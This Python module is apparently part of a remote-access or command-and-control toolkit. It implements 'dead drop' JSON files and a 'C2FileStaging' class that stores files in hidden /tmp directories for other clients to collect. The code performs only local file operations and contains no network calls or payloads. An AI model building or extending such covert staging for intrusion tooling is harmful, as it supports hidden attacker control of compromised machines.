# Dead Drop Module
import platform
import os
import json
import base64
import hashlib
from pathlib import Path
import threading
import time

class DeadDrop:
    def __init__(self, drop_dir: str = '/tmp/.rs_drops'):
        self.drop_dir = drop_dir
        Path(drop_dir).mkdir(parents=True, exist_ok=True)
        
    def create_drop(self, name: str, data: str, metadata: dict = None):
        """Create a dead drop with data"""
        try:
            drop_file = Path(self.drop_dir) / f"{name}.drop"
            
            drop_data = {
                "name": name,
                "data": data,
                "metadata": metadata or {},
                "created": time.time(),
                "hash": hashlib.sha256(data.encode()).hexdigest()
            }
            
            with open(drop_file, 'w') as f:
                json.dump(drop_data, f)
            
            return {
                "success": True,
                "path": str(drop_file),
                "name": name
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def read_drop(self, name: str):
        """Read a dead drop"""
        try:
            drop_file = Path(self.drop_dir) / f"{name}.drop"
            
            if not drop_file.exists():
                return {"success": False, "message": "Drop not found"}
            
            with open(drop_file, 'r') as f:
                drop_data = json.load(f)
            
            return {
                "success": True,
                "data": drop_data["data"],
                "metadata": drop_data.get("metadata", {}),
                "created": drop_data.get("created"),
                "hash": drop_data.get("hash")
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def list_drops(self):
        """List all dead drops"""
        try:
            drops = []
            
            for drop_file in Path(self.drop_dir).glob("*.drop"):
                try:
                    with open(drop_file, 'r') as f:
                        drop_data = json.load(f)
                    
                    drops.append({
                        "name": drop_data["name"],
                        "created": drop_data.get("created"),
                        "hash": drop_data.get("hash"),
                        "size": drop_file.stat().st_size
                    })
                except:
                    pass
            
            return {"success": True, "drops": drops}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def delete_drop(self, name: str):
        """Delete a dead drop"""
        try:
            drop_file = Path(self.drop_dir) / f"{name}.drop"
            
            if drop_file.exists():
                drop_file.unlink()
                return {"success": True, "message": f"Drop {name} deleted"}
            
            return {"success": False, "message": "Drop not found"}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def watch_for_drops(self, callback):
        """Watch for new drops and call callback"""
        def watch_loop():
            last_files = set()
            
            while True:
                current_files = set(Path(self.drop_dir).glob("*.drop"))
                new_files = current_files - last_files
                
                for drop_file in new_files:
                    try:
                        with open(drop_file, 'r') as f:
                            drop_data = json.load(f)
                        callback(drop_data)
                    except:
                        pass
                
                last_files = current_files
                time.sleep(5)
        
        thread = threading.Thread(target=watch_loop, daemon=True)
        thread.start()
        
        return {"success": True, "message": "Drop watcher started"}


class C2FileStaging:
    def __init__(self, stage_dir: str = '/tmp/.rs_staging'):
        self.stage_dir = stage_dir
        Path(stage_dir).mkdir(parents=True, exist_ok=True)
        
    def stage_file(self, name: str, content: str):
        """Stage a file for download by other clients"""
        try:
            file_path = Path(self.stage_dir) / name
            
            with open(file_path, 'w') as f:
                f.write(content)
            
            return {
                "success": True,
                "path": str(file_path),
                "name": name
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_staged_file(self, name: str):
        """Get a staged file"""
        try:
            file_path = Path(self.stage_dir) / name
            
            if not file_path.exists():
                return {"success": False, "message": "File not found"}
            
            with open(file_path, 'r') as f:
                content = f.read()
            
            return {
                "success": True,
                "content": content,
                "size": file_path.stat().st_size
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def list_staged_files(self):
        """List all staged files"""
        try:
            files = []
            
            for file_path in Path(self.stage_dir).iterdir():
                if file_path.is_file():
                    files.append({
                        "name": file_path.name,
                        "size": file_path.stat().st_size,
                        "modified": file_path.stat().st_mtime
                    })
            
            return {"success": True, "files": files}
        except Exception as e:
            return {"success": False, "error": str(e)}


def create_dead_drop(name: str, data: str):
    """Quick dead drop creation function"""
    dd = DeadDrop()
    return dd.create_drop(name, data)


def read_dead_drop(name: str):
    """Quick dead drop read function"""
    dd = DeadDrop()
    return dd.read_drop(name)
